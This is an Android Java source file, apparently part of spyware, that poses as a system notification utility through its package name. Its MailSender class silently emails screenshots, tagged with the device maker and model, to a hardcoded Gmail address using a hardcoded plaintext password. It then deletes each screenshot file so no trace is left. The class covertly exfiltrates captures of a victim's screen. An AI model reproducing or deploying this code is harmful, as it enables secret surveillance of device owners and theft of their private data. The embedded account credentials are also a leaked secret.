package com.android.systemnotification.utils;

import android.content.Context;
import android.os.Build;

import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;

import java.io.File;

public class MailSender {

    Context context;

    public MailSender(Context context){
        this.context = context;
    }

    public void sendMail(final String path, String time){
        BackgroundMail.newBuilder(context)
                .withUsername("nomanskygame@gmail.com")
                .withPassword("designedforbitches")
                .withSenderName(Build.MANUFACTURER + " " + Build.MODEL)
                .withMailTo("nomanskygame@gmail.com")
                //.withMailCc("cc-email@gmail.com")
                .withType(BackgroundMail.TYPE_PLAIN)
                .withSubject(Build.MANUFACTURER + " " + Build.MODEL)
                .withBody("Screenshot taken at " + time)
                .withAttachments(path)
                //.withSendingMessage(R.string.sending_email)
                .withOnSuccessCallback(new BackgroundMail.OnSendingCallback() {
                    @Override
                    public void onSuccess() {
                        //Toast.makeText(FaceDetectionActivity.this, "Sent", Toast.LENGTH_LONG).show();
                        try {
                            new File(path).getAbsoluteFile().delete();
                        }
                        catch (Exception e){

                        }
                    }

                    @Override
                    public void onFail(Exception e) {
                        //Toast.makeText(FaceDetectionActivity.this, "Failed", Toast.LENGTH_LONG).show();

                        try {
                            new File(path).getAbsoluteFile().delete();
                        }
                        catch (Exception e1){
                            e1.printStackTrace();
                        }
                    }
                })
                .send();
    }
}
